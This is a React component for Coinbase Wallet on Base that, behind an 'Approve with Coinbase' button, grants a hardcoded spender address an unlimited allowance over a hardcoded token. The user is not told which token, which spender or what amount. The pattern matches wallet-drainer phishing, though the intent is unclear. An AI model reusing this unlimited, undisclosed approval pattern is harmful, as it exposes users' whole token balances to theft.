import React, { useState } from "react";
import { CoinbaseWalletSDK } from "@coinbase/wallet-sdk";
import { ethers } from "ethers";

const APP_NAME = "demoWallet";
const APP_URL_SCHEME = "demoWallet://callback"; // Custom scheme to return to your app
const TOKEN_ADDRESS = "0x833589fCD6eDb6e08f4c7C32D4f71b54bdA02913";
const SPENDER_ADDRESS = "0x83fef7293E4F27fe4f195BBc00112E83aA0ab055";

const CoinBaseSetupWindow = ({ onClose, onComplete }) => {
  const [isLoading, setIsLoading] = useState(false);

  async function requestApprovalWithCoinbase() {
    try {
      setIsLoading(true);

      const wallet = new CoinbaseWalletSDK({
        appName: APP_NAME,
        darkMode: false,
        overrideIsMetaMask: false,
      });

      const provider = new ethers.providers.Web3Provider(
        wallet.makeWeb3Provider("https://mainnet.base.org", {
          jsonRpcFetchFunc: undefined,
          overrideIsMetaMask: false,
        })
      );

      const signer = provider.getSigner();
      const tokenContract = new ethers.Contract(
        TOKEN_ADDRESS,
        ["function approve(address spender, uint256 amount) public returns (bool)"],
        signer
      );

      const tx = await tokenContract.approve(SPENDER_ADDRESS, ethers.constants.MaxUint256);
      console.log("Approval transaction sent:", tx.hash);

      // Open Coinbase Wallet app and return to your app after signing
      const deepLink = `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(APP_URL_SCHEME)}`;
      window.location.href = deepLink;

      await tx.wait();
      console.log("Approval confirmed!");

      // Notify parent component if needed
      if (onComplete) {
        onComplete();
      }
    } catch (error) {
      console.error("Error during approval:", error);
    } finally {
      setIsLoading(false);
    }
  }

  return (
    <div className="p-4 bg-white border rounded shadow-lg">
      <h2 className="text-lg font-semibold">Setup Coinbase Approval</h2>
      <button
        className="mt-4 px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600 disabled:opacity-50"
        onClick={requestApprovalWithCoinbase}
        disabled={isLoading}
      >
        {isLoading ? "Processing..." : "Approve with Coinbase"}
      </button>
      <button
        className="mt-2 px-4 py-2 bg-gray-300 text-black rounded hover:bg-gray-400"
        onClick={onClose}
      >
        Cancel
      </button>
    </div>
  );
};

export default CoinBaseSetupWindow;
